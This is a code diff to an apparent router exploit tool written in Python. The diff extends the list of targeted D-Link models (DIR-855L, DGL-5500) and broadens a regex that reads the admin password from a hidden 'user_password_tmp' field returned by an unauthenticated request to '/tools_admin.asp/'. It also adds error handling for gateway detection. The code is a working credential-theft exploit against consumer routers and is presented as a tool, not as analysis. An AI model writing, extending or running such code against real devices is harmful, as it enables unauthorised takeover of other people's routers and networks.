@@ -41,7 +41,9 @@ class Attacks:
 
 # List of supported routers, and their attack type
 routers = {
-    "DIR-835": Attacks.USERLESS
+    "DIR-835": Attacks.USERLESS,
+    "DIR-855L": Attacks.USERLESS,
+    "DGL-5500": Attacks.USERLESS
 }
 
 
@@ -50,14 +52,20 @@ routers = {
 
 def getRouterIP() -> str:
     """ Gets the IP address of the router """
-
+    
     with open("/proc/net/route") as fh:
         for line in fh:
             fields = line.strip().split()
             if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                 continue
 
-            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
+            ip = socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
+
+            if ip:
+                return ip
+            else:
+                return "FAIL"
+    return "FAIL"
 
 
 def getRouterType(ip: str) -> str:
@@ -89,7 +97,7 @@ def getPassword(ip: str, attack_type: int) -> str:
     data = requests.get("http://" + ip + "/tools_admin.asp/").text
 
     password = str(re.search(
-        '<input type="hidden" id="user_password_tmp" name="user_password_tmp" value="(.*)">', data).group(1))
+        'name="user_password_tmp" value="(.*)">', data).group(1))
     return password
 
 
@@ -145,8 +153,14 @@ def main():
         else:
             # Check for router IP
             router.ip = getRouterIP()
-            print(ASCII.Green + "    [*] " + ASCII.Reset +
-                "Found router ip via gateway (" + router.ip + ")     ")
+
+            if router.ip == "FAIL":
+                print(ASCII.Red + "    [ ] " + ASCII.Reset +
+                    "Unable to read gateway configuration. This device may be incorrectly configured, or running Android.\n")
+                exit(1)
+            else:
+                print(ASCII.Green + "    [*] " + ASCII.Reset +
+                    "Found router ip via gateway (" + router.ip + ")     ")
     else:
         print(ASCII.Green + "    [*] " + ASCII.Reset + f"Using ip address supplied by user ({manual_ip})")
         router.ip = manual_ip
